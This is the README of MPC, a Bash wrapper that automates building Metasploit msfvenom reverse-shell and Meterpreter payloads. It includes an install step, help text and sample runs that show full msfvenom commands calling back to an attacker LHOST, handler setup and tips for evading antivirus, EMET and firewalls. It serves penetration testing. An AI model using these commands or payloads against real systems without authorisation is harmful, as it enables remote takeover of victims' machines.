A **quick** way to generate various "basic" Meterpreter payloads via msfvenom (part of the Metasploit framework).

![Msfvenom Payload Creator (MPC)](https://i.imgur.com/JwSYBRZ.png)

- - -

## About

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** msfvenom & Metasploit is the end goal _(well as to be be able to automate MPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands**, **batch payload production** and able to enter **any argument in any order** _(in various formats/patterns)_).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

* Can't remember your IP for a interface? Don't sweat it, just use the interface name: `eth0`.
* Don't know what your external IP is? MPC will discover it: `wan`.
* Want to generate one of each payload? No issue! Try: `loop`.
* Want to mass create payloads? Everything? Or to filter your select? ..Either way, its not a problem. Try: `batch` (for everything), `batch msf` (for every Meterpreter option), `batch staged` (for every staged payload), or `batch cmd stageless` (for every stageless command prompt)!

_Note: This will **not** try to bypass any anti-virus solutions._

## Install

* Designed for **Kali Linux v1.1.0a+** & **Metasploit v4.11+** _(nothing else has been tested)_.

```
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
```

## Help

``` bash
root@kali:~# mpc -h -v
 [*] Msfvenom Payload Creator (MPC v1.3)

 [i] /usr/bin/mpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
 [i]   Example: /usr/bin/mpc windows 192.168.1.10        # Windows & manual IP.
 [i]            /usr/bin/mpc elf eth0 4444               # Linux, eth0's IP & manual port.
 [i]            /usr/bin/mpc stageless cmd py verbose    # Python, stageless command prompt.
 [i]            /usr/bin/mpc loop eth1                   # A payload for every type, using eth1's IP.
 [i]            /usr/bin/mpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
 [i]            /usr/bin/mpc help verbose                # This help screen, with even more information.

 [i] <TYPE>:
 [i]   + ASP
 [i]   + ASPX
 [i]   + Bash [.sh]
 [i]   + Java [.jsp]
 [i]   + Linux [.elf]
 [i]   + OSX [.macho]
 [i]   + Perl [.pl]
 [i]   + PHP
 [i]   + Powershell [.ps1]
 [i]   + Python [.py]
 [i]   + Tomcat [.war]
 [i]   + Windows [.exe]

 [i] Rather than putting <DOMAIN/IP>, you can do a interface and MPC will detect that IP address.
 [i] Missing <DOMAIN/IP> will default to the IP menu.

 [i] Missing <PORT> will default to 443.

 [i] <CMD> is a standard/native command prompt/terminal to interactive with.
 [i] <MSF> is a custom cross platform Meterpreter shell, gaining the full power of Metasploit.
 [i] Missing <CMD/MSF> will default to <MSF> where possible.
 [i]   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format.
 [i] <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support.
 [i] <MSF> payloads are generally much larger than <CMD>, as it comes with more features.

 [i] <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 [i] <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 [i] Missing <BIND/REVERSE> will default to <REVERSE>.
 [i] <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access.

 [i] <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 [i] <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 [i] Missing <STAGED/STAGELESS> will default to <STAGED> where possible.
 [i]   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format.
 [i] <STAGED> are 'better' in low-bandwidth/high-latency environments.
 [i] <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS.
 [i] More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
 [i]                   https://www.offensive-security.com/metasploit-unleashed/payload-types/
 [i]                   https://www.offensive-security.com/metasploit-unleashed/payloads/

 [i] <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 [i] <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 [i] <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 [i] <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 [i] Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.
 [i] By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size.
 [i] More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication

 [i] <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT>
 [i] <LOOP> will just create one of each <TYPE>.

 [i] <VERBOSE> will display more information.
root@kali:~#
```

## Example \#1 (Windows, Fully Automated With IP)

```bash
root@kali:~# mpc windows 192.168.1.10
 [*] Msfvenom Payload Creator (MPC v1.3)
 [i]   IP: 192.168.1.10
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e generic/none LHOST=192.168.1.10 LPORT=443 > /root/windows-meterpreter-staged-reverse-tcp-443.exe
 [i] File (/root/windows-meterpreter-staged-reverse-tcp-443.exe) already exists. Overwriting...
 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'
 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'   (msfconsole -q -r /root/windows-meterpreter-staged-reverse-tcp-443-exe.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## Example \#2 (Linux Format, Fully Automated With Interface and Port)

```bash
root@kali:~# ./mpc elf eth0 4444
 [*] Msfvenom Payload Creator (MPC v1.3)
 [i]   IP: 192.168.103.238
 [i] PORT: 4444
 [i] TYPE: linux (linux/x86/shell/reverse_tcp)
 [i]  CMD: msfvenom -p linux/x86/shell/reverse_tcp -f elf --platform linux -a x86 -e generic/none LHOST=192.168.103.238 LPORT=4444 > /root/linux-shell-staged-reverse-tcp-4444.elf
 [i] linux shell created: '/root/linux-shell-staged-reverse-tcp-4444.elf'
 [i] MSF handler file: '/root/linux-shell-staged-reverse-tcp-4444-elf.rc'   (msfconsole -q -r /root/linux-shell-staged-reverse-tcp-4444-elf.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```

## Example \#3 (Python Format, Stageless Command Prompt Using Interactive IP Menu)

```bash
root@kali:~# mpc stageless cmd py verbose
 [*] Msfvenom Payload Creator (MPC v1.3)

 [i] Use which interface/IP address?:
 [i]   1.) eth0 - 192.168.103.238
 [i]   2.) eth1 - 192.168.155.175
 [i]   3.) tap0 - 10.10.100.63
 [i]   4.) lo - 127.0.0.1
 [i]   5.) wan - xx.xx.xx.xx
 [?] Select 1-5, interface or IP address: 3

 [i]        IP: 10.10.100.63
 [i]      PORT: 443
 [i]      TYPE: python (python/shell_reverse_tcp)
 [i]     SHELL: shell
 [i] DIRECTION: reverse
 [i]     STAGE: stageless
 [i]    METHOD: tcp
 [i]       CMD: msfvenom -p python/shell_reverse_tcp -f raw --platform python -e generic/none -a python LHOST=10.10.100.63 LPORT=443 > /root/python-shell-stageless-reverse-tcp-443.py
 [i] python shell created: '/root/python-shell-stageless-reverse-tcp-443.py'
 [i] File: ASCII text, with very long lines, with no line terminators
 [i] Size: 4.0K
 [i]  MD5: 53452eafafe21bff94e6c4621525165b
 [i] SHA1: 18641444f084c5fe7e198c29bf705a68b15c2cc9
 [i] MSF handler file: '/root/python-shell-stageless-reverse-tcp-443-py.rc'   (msfconsole -q -r /root/python-shell-stageless-reverse-tcp-443-py.rc)
 [?] Quick web server for file transfer?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:~#
```
_Note: Removed WAN IP._

![Examples](https://i.imgur.com/r9Qmzda.png)

- - -

## To-Do List

* Shellcode generation
* x64 payloads
* IPv6 support
* Look into using OS scripting more _(`powershell_bind_tcp` & `bind_perl` etc)_